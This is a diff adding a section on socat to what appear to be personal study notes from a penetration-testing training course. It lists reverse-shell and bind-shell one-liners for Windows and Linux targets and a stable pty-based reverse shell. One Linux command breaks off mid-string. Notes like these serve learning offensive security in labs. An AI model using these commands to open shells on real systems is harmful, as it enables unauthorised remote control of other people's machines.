@@ -58,3 +58,18 @@ Netcat shells aren't stable and are non-interactive by default
     * update columns using number above - stty cols [number]
     * changing these values allow text editors and other tools to display properly
 
+# Task 6 - Socat
+Provides a link between two points
+## Reverse Shell
+* Local: socat TCP-L:[local_port]
+* Remote (Windows): socat TCP:[local_ip]:[local_port] EXEC:powershell.exe,pipes
+    * pipes forces powershell to use Unix standard IO
+* Remote (Linux): socat TCP:[local_ip]:[local_port] EXEC:"
+## Bind Shell
+* Remote (Linux): socat TCP-L:[remote_port] EXEC:"bash -li"
+* Remote (Windows): socat TCP-L:[remote_port] EXEC:powershell.exe,pipes
+* Local: socat TCP:[remote_ip]:[remote_port] -
+## Stable Reverse Shell
+* Local: socat TCP-L:[local] FILE:\`tty`,raw,echo=0
+* Remote: socat TCP:[local_ip]:[local_port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+* This shell only works when the target is using Linux
